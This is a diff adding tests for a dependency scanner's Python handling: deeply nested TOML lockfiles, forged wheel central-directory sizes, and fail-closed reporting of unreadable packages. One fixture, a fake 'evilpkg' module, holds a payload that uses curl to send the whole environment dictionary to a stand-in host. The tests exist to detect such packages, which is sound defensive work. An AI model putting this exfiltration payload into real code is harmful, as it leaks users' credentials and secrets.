@@ -12,11 +12,12 @@ import { mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync, readdirSyn
 import { join, resolve } from "node:path";
 import { tmpdir } from "node:os";
 import { execFileSync } from "node:child_process";
-import { buildPythonFixtures } from "./fixtures/deps/build-python.js";
+import { createHash } from "node:crypto";
+import { buildPythonFixtures, zip, distFiles } from "./fixtures/deps/build-python.js";
 import { parseToml } from "../lib/deps/python/toml.js";
 import { parseRequirements, parsePythonInput, normalizeName, findPythonInputs } from "../lib/deps/python/lockfiles.js";
 import { blankPython, scanPythonSource, scanPythonPackage, pthImportLines } from "../lib/deps/python/capabilities.js";
-import { parseRecord, parseMetadata, listInstalled, sitePackagesDirs, unzip, msgpackFirst, sourceFromPipCache, sourceFromUvCache } from "../lib/deps/python/source.js";
+import { parseRecord, parseMetadata, listInstalled, sitePackagesDirs, unzip, sourceFromArtifact, msgpackFirst, sourceFromPipCache, sourceFromUvCache } from "../lib/deps/python/source.js";
 import { checkName, findTyposquats, loadPopular } from "../lib/deps/typosquat.js";
 import { scanDeps } from "../lib/deps/index.js";
 import { formatPrComment } from "../lib/deps/report.js";
@@ -464,5 +465,86 @@ describe("hostile Python input stays cheap", () => {
   it("rejects a TOML document it cannot read instead of looping", () => {
     expect(() => parseToml("[[package]]\nname = \n")).toThrow(/TOML/);
     expect(() => parseToml("a = [1, 2")).toThrow(/TOML/);
+  });
+
+  it("a deeply nested lockfile is a parse error, not a stack overflow", async () => {
+    const deep = `version = 1\n[[package]]\nname = "x"\nversion = "1"\nwheels = ${"[".repeat(200_000)}\n`;
+    expect(() => parseToml(deep)).toThrow(/TOML: nested deeper than 200 levels/);
+    expect(() => parseToml(`a = ${"{ b = ".repeat(300)}1${" }".repeat(300)}`)).toThrow(/nested deeper/);
+    expect(parseToml(`a = ${"[".repeat(150)}1${"]".repeat(150)}`).a).toBeDefined();
+    const root = join(dir, "deep-lock");
+    mkdirSync(root, { recursive: true });
+    writeFileSync(join(root, "uv.lock"), deep);
+    await expect(scanDeps(root, { pipCacheDir: emptyCache, uvCacheDir: emptyCache })).rejects.toThrow(/uv\.lock could not be parsed: TOML: nested deeper/);
+  });
+});
+
+// ── Python sources fail closed ────────────────────────────────────────────
+
+describe("Python sources fail closed", () => {
+  const PAYLOAD = `import os\nimport ${SUBPROCESS}\n${SUBPROCESS}.run(["curl", "-d", str(dict(${ENVIRON})), "https://c.invalid"])\n`;
+  const wheelFiles = () => distFiles("evilpkg", "1.0.0", { "aaa/pad.txt": "pad", "evilpkg/__init__.py": PAYLOAD });
+  /** The wheel above, with its first entry's central-directory size set to `claim`. */
+  function forgedWheel(claim) {
+    const w = zip(wheelFiles());
+    const cd = w.readUInt32LE(w.length - 22 + 16);
+    expect(w.subarray(cd + 46, cd + 46 + 11).toString()).toBe("aaa/pad.txt");
+    w.writeUInt32LE(claim, cd + 24);
+    return w;
+  }
+
+  it("a forged central-directory size makes the wheel unscanned instead of hiding later entries", () => {
+    expect(() => unzip(forgedWheel(300 * 1024 * 1024))).toThrow(/"aaa\/pad.txt" holds 3 bytes, the archive says 314572800/);
+    const r = scanPythonPackage(sourceFromArtifact(forgedWheel(300 * 1024 * 1024), "pip-cache"));
+    expect(r.unscanned).toMatch(/could not be read safely.*aaa\/pad\.txt/);
+    // The honest wheel is read whole, payload included.
+    const honest = scanPythonPackage(sourceFromArtifact(zip(wheelFiles()), "pip-cache"));
+    expect(honest.unscanned).toBeNull();
+    expect(Object.keys(honest.capabilities)).toContain("shell");
+  });
+
+  it("throws on structural anomalies rather than stopping early", () => {
+    const good = zip({ "a.py": "x = 1\n", "b.py": "y = 2\n" });
+    expect(unzip(good).size).toBe(2);
+    const cd = good.readUInt32LE(good.length - 22 + 16);
+    const badSig = Buffer.from(good);
+    badSig.writeUInt32LE(0, cd);
+    expect(() => unzip(badSig)).toThrow(/bad central directory record/);
+    const badLocal = Buffer.from(good);
+    badLocal.writeUInt32LE(0, 0);
+    expect(() => unzip(badLocal)).toThrow(/bad local header/);
+    const badMethod = Buffer.from(good);
+    badMethod.writeUInt16LE(99, cd + 10);
+    expect(() => unzip(badMethod)).toThrow(/compression method 99/);
+    expect(() => unzip(good, { maxTotal: 8 })).toThrow(/over 8 bytes/);
+  });
+
+  it("a source with an anomaly, no files, or more files than listed is unscanned", () => {
+    expect(scanPythonPackage(new MapSource(new Map(), "pip-cache", { anomaly: "archive could not be read safely (x)" })).unscanned).toMatch(/could not be read safely/);
+    expect(scanPythonPackage(new MapSource(new Map(), "pip-cache")).unscanned).toMatch(/no files/);
+    const files = new Map([["a.py", Buffer.from("x = 1\n")], ["b.py", Buffer.from("y = 2\n")], ["zz/evil.py", Buffer.from(PAYLOAD)]]);
+    expect(scanPythonPackage(new MapSource(files, "pip-cache", { maxFiles: 2 })).unscanned).toMatch(/more than 2 files/);
+    expect(scanPythonPackage(new MapSource(files, "pip-cache")).unscanned).toBeNull();
+    expect(scanPythonPackage(sourceFromArtifact(Buffer.from("not an archive"), "local")).unscanned).toMatch(/neither a wheel/);
+  });
+
+  it("scanDeps reports a pinned wheel that cannot be read as could-not-be-scanned (high)", async () => {
+    const root = join(dir, "forged");
+    const cache = join(root, "pip-cache");
+    const whl = forgedWheel(300 * 1024 * 1024);
+    const hex = createHash("sha256").update(whl).digest("hex");
+    mkdirSync(join(cache, "http-v2", "a", "b"), { recursive: true });
+    writeFileSync(join(cache, "http-v2", "a", "b", "w.body"), whl);
+    writeFileSync(join(root, "uv.lock"), [
+      "version = 1", 'requires-python = ">=3.12"', "",
+      "[[package]]", 'name = "evilpkg"', 'version = "1.0.0"', 'source = { registry = "https://pypi.org/simple" }',
+      "wheels = [", `    { url = "https://files.pythonhosted.org/packages/00/00/x/evilpkg-1.0.0-py3-none-any.whl", hash = "sha256:${hex}", size = ${whl.length} },`, "]", "",
+      "[[package]]", 'name = "app"', 'version = "0.1.0"', 'source = { virtual = "." }', "dependencies = [", '    { name = "evilpkg" },', "]", "",
+    ].join("\n"));
+    const r = await scanDeps(root, { pipCacheDir: cache, uvCacheDir: emptyCache });
+    expect(r.findings.find((f) => /could not be scanned/.test(f.title))).toMatchObject({ severity: "high", package: "evilpkg" });
+    expect(r.deps.unscanned).toEqual([expect.objectContaining({ package: "evilpkg@1.0.0" })]);
+    expect(r.deps.packages.find((p) => p.name === "evilpkg").capabilities).toBeNull();
+    expect(r.deps.notInstalled).toEqual([]);
   });
 });
